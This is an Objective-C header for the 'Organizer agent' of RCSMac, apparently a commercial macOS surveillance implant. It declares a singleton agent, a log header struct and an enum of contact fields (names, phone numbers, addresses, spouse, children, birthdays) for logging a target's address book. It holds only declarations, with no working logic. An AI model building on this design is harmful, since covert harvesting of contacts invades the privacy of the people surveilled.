/*
 * RCSMac - Organizer agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 26/11/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSMAgentOrganizer_h__
#define __RCSMAgentOrganizer_h__

#import "RCSMLogManager.h"

#define	CONTACT_LOG_VERSION	0x01000000

typedef struct _organizerAdditionalHeader{
  u_int size;
  u_int version;
  u_int identifier;
} organizerAdditionalHeader;

enum contactType {
  FirstName                 = 0x1,
  LastName                  = 0x2,
  CompanyName               = 0x3,
  BusinessFaxNumber         = 0x4,
  Department                = 0x5,
  Email1Address             = 0x6,
  MobileTelephoneNumber     = 0x7,
  OfficeLocation            = 0x8, 
  PagerNumber               = 0x9,
  BusinessTelephoneNumber   = 0xA,
  JobTitle                  = 0xB,
  HomeTelephoneNumber       = 0xC,
  Email2Address             = 0xD,
  Spouse                    = 0xE,
  Email3Address             = 0xF,
  Home2TelephoneNumber      = 0x10,
  HomeFaxNumber             = 0x11,
  CarTelephoneNumber        = 0x12,
  AssistantName             = 0x13,
  AssistantTelephoneNumber  = 0x14,
  Children                  = 0x15,
  Categories                = 0x16,
  WebPage                   = 0x17,
  Business2TelephoneNumber  = 0x18,
  RadioTelephoneNumber      = 0x19,
  FileAs                    = 0x1A,
  YomiCompanyName           = 0x1B,
  YomiFirstName             = 0x1C,
  YomiLastName              = 0x1D,
  Title                     = 0x1E,
  MiddleName                = 0x1F,
  Suffix                    = 0x20,
  HomeAddressStreet         = 0x21,
  HomeAddressCity           = 0x22,
  HomeAddressState          = 0x23,
  HomeAddressPostalCode     = 0x24,
  HomeAddressCountry        = 0x25,
  OtherAddressStreet        = 0x26,
  OtherAddressCity          = 0x27,
  OtherAddressPostalCode    = 0x28,
  OtherAddressCountry       = 0x29,
  BusinessAddressStreet     = 0x2A,
  BusinessAddressCity       = 0x2B,
  BusinessAddressState      = 0x2C, 
  BusinessAddressPostalCode = 0x2D,
  BusinessAddressCountry    = 0x2E,
  OtherAddressState         = 0x2F,
  Body                      = 0x30,
  // Birthday & Anniversary are string (wchar) converted FILETIME struct
  Birthday                  = 0x31,
  Anniversary               = 0x32
};

@interface __m_MAgentOrganizer : NSObject <Agents>
{
@private
  NSMutableDictionary *mConfiguration;
}

+ (__m_MAgentOrganizer *)sharedInstance;
- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (void)release;
- (id)autorelease;
- (id)retain;
- (unsigned)retainCount;

- (NSMutableDictionary *)mConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;


@end

#endif // __RCSMAgentOrganizer_h__